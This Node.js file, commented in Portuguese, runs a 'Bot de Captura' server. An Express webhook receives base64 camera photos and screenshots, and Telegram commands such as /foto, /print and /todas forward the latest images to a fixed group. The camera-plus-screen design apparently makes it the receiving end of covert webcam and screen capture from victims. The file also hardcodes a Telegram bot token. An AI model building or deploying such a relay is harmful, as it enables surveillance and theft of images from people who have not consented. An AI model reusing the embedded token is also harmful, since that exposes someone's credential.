const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');

// Configurações do bot
const token = '8507516529:AAGME_SVCYjU8tpUhgzccq7fDXFJVyv57Uk';
const GROUP_CHAT_ID = -5189809274; // ID do seu grupo

const bot = new TelegramBot(token, { polling: true });

const app = express();
app.use(bodyParser.json({ limit: '50mb' }));

// Armazenar as últimas imagens recebidas
let lastPhoto = null;
let lastScreen = null;
let lastPhotoTime = null;
let lastScreenTime = null;

// Middleware para verificar se a mensagem é do grupo correto
function isFromAllowedGroup(msg) {
    return msg.chat.id === GROUP_CHAT_ID;
}

// Comando /start
bot.onText(/\/start/, (msg) => {
    if (!isFromAllowedGroup(msg)) {
        bot.sendMessage(msg.chat.id, '❌ Este bot só funciona no grupo autorizado.');
        return;
    }
    
    bot.sendMessage(GROUP_CHAT_ID, 
        '👋 *Bot de Captura Iniciado!*\n\n' +
        'Comandos disponíveis:\n' +
        '/foto - 📸 Receber última foto da câmera\n' +
        '/print - 🖥️ Receber último print da tela\n' +
        '/todas - 📱 Receber ambas as imagens\n' +
        '/status - ℹ️ Ver status das imagens\n' +
        '/ajuda - ❓ Mostrar esta mensagem',
        { parse_mode: 'Markdown' }
    );
});

// Comando para receber apenas a foto da câmera
bot.onText(/\/foto/, async (msg) => {
    if (!isFromAllowedGroup(msg)) return;
    
    if (lastPhoto) {
        try {
            await bot.sendPhoto(GROUP_CHAT_ID, Buffer.from(lastPhoto, 'base64'), {
                caption: `📸 *Foto da Câmera*\n🕐 ${lastPhotoTime || 'Agora mesmo'}`,
                parse_mode: 'Markdown'
            });
        } catch (error) {
            console.error('Erro ao enviar foto:', error);
            bot.sendMessage(GROUP_CHAT_ID, '❌ Erro ao enviar a foto da câmera.');
        }
    } else {
        bot.sendMessage(GROUP_CHAT_ID, '❌ Nenhuma foto de câmera disponível ainda.');
    }
});

// Comando para receber apenas o print da tela
bot.onText(/\/print/, async (msg) => {
    if (!isFromAllowedGroup(msg)) return;
    
    if (lastScreen) {
        try {
            await bot.sendPhoto(GROUP_CHAT_ID, Buffer.from(lastScreen, 'base64'), {
                caption: `🖥️ *Print da Tela*\n🕐 ${lastScreenTime || 'Agora mesmo'}`,
                parse_mode: 'Markdown'
            });
        } catch (error) {
            console.error('Erro ao enviar print:', error);
            bot.sendMessage(GROUP_CHAT_ID, '❌ Erro ao enviar o print da tela.');
        }
    } else {
        bot.sendMessage(GROUP_CHAT_ID, '❌ Nenhum print de tela disponível ainda.');
    }
});

// Comando para receber ambas as imagens
bot.onText(/\/todas/, async (msg) => {
    if (!isFromAllowedGroup(msg)) return;
    
    if (lastPhoto && lastScreen) {
        try {
            // Envia a foto da câmera
            await bot.sendPhoto(GROUP_CHAT_ID, Buffer.from(lastPhoto, 'base64'), {
                caption: `📸 *Foto da Câmera*\n🕐 ${lastPhotoTime || 'Agora mesmo'}`,
                parse_mode: 'Markdown'
            });
            
            // Envia o print da tela
            await bot.sendPhoto(GROUP_CHAT_ID, Buffer.from(lastScreen, 'base64'), {
                caption: `🖥️ *Print da Tela*\n🕐 ${lastScreenTime || 'Agora mesmo'}`,
                parse_mode: 'Markdown'
            });
            
        } catch (error) {
            console.error('Erro ao enviar imagens:', error);
            bot.sendMessage(GROUP_CHAT_ID, '❌ Erro ao enviar as imagens.');
        }
    } else {
        bot.sendMessage(GROUP_CHAT_ID, '❌ Ainda não há ambas as imagens disponíveis.');
    }
});

// Comando de status
bot.onText(/\/status/, (msg) => {
    if (!isFromAllowedGroup(msg)) return;
    
    const status = `📊 *Status das Imagens*\n\n` +
                  `📸 Câmera: ${lastPhoto ? '✅ Disponível' : '❌ Indisponível'}\n` +
                  `🖥️ Tela: ${lastScreen ? '✅ Disponível' : '❌ Indisponível'}\n\n` +
                  `🕐 Última atualização:\n` +
                  `📸 Câmera: ${lastPhotoTime || 'Nunca'}\n` +
                  `🖥️ Tela: ${lastScreenTime || 'Nunca'}`;
    
    bot.sendMessage(GROUP_CHAT_ID, status, { parse_mode: 'Markdown' });
});

// Comando de ajuda
bot.onText(/\/ajuda/, (msg) => {
    if (!isFromAllowedGroup(msg)) return;
    
    bot.sendMessage(GROUP_CHAT_ID, 
        '📚 *Comandos Disponíveis*\n\n' +
        '/foto - 📸 Receber última foto da câmera\n' +
        '/print - 🖥️ Receber último print da tela\n' +
        '/todas - 📱 Receber ambas as imagens\n' +
        '/status - ℹ️ Ver status das imagens\n' +
        '/ajuda - ❓ Mostrar esta mensagem\n\n' +
        '*Como usar:*\n' +
        '1️⃣ Envie imagens para o webhook\n' +
        '2️⃣ Use os comandos acima para recebê-las',
        { parse_mode: 'Markdown' }
    );
});

// Endpoint para receber as imagens
app.post('/webhook', async (req, res) => {
    try {
        const { photo, screen } = req.body;
        const now = new Date().toLocaleString('pt-BR');
        
        if (photo) {
            lastPhoto = photo;
            lastPhotoTime = now;
            console.log(`📸 Foto da câmera recebida em ${now}`);
            
            // Notifica o grupo que recebeu nova imagem (opcional)
            // bot.sendMessage(GROUP_CHAT_ID, `📸 Nova foto da câmera recebida! Use /foto para ver.`);
        }
        
        if (screen) {
            lastScreen = screen;
            lastScreenTime = now;
            console.log(`🖥️ Print da tela recebido em ${now}`);
            
            // Notifica o grupo que recebeu novo print (opcional)
            // bot.sendMessage(GROUP_CHAT_ID, `🖥️ Novo print da tela recebido! Use /print para ver.`);
        }

        res.status(200).json({ 
            success: true, 
            message: 'Imagens recebidas com sucesso',
            timestamp: now
        });
    } catch (error) {
        console.error('Erro ao processar webhook:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Erro ao processar imagens' 
        });
    }
});

// Endpoint para verificar status
app.get('/status', (req, res) => {
    res.json({
        status: 'online',
        group_chat_id: GROUP_CHAT_ID,
        hasPhoto: !!lastPhoto,
        hasScreen: !!lastScreen,
        lastPhotoTime: lastPhotoTime,
        lastScreenTime: lastScreenTime,
        timestamp: new Date().toISOString()
    });
});

// Endpoint simples para testar
app.get('/', (req, res) => {
    res.send(`
        <h1>🤖 Bot do Telegram está ativo!</h1>
        <p>Grupo ID: ${GROUP_CHAT_ID}</p>
        <p>Status: <a href="/status">Verificar status</a></p>
    `);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Servidor rodando na porta ${PORT}`);
    console.log(`🤖 Bot do Telegram está ativo no grupo: ${GROUP_CHAT_ID}`);
    console.log(`📸 Webhook URL: http://localhost:${PORT}/webhook`);
});